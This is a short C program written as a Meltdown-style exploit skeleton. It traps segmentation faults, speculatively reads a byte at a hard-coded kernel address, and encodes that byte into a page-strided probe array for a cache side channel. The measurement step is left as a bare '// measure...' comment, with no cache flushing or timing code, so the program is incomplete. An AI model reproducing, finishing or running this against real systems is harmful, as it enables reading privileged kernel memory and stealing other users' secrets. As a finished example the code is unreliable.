#include <stdio.h>
#include <signal.h>
#include <setjmp.h>
#include <stdint.h>

static sigjmp_buf jbuf;

#define KERNEL_ADDR 0xffffffffffd00000
#define PAGE_SIZE 4096

uint8_t probe_array[256 * PAGE_SIZE];

void segfault_handler(int sig) {
    siglongjmp(jbuf, 1);
}

void meltdown_read_byte(const uint64_t kernel_addr) {
    unsigned char value = 0;

    if (sigsetjmp(jbuf, 1) == 0) {
        value = *(volatile unsigned char *)kernel_addr;
        probe_array[value * PAGE_SIZE] += 1;
    } else {
        // recovered
    }
}

int main() {
    signal(SIGSEGV, segfault_handler);

    meltdown_read_byte(KERNEL_ADDR);

    // measure...
}
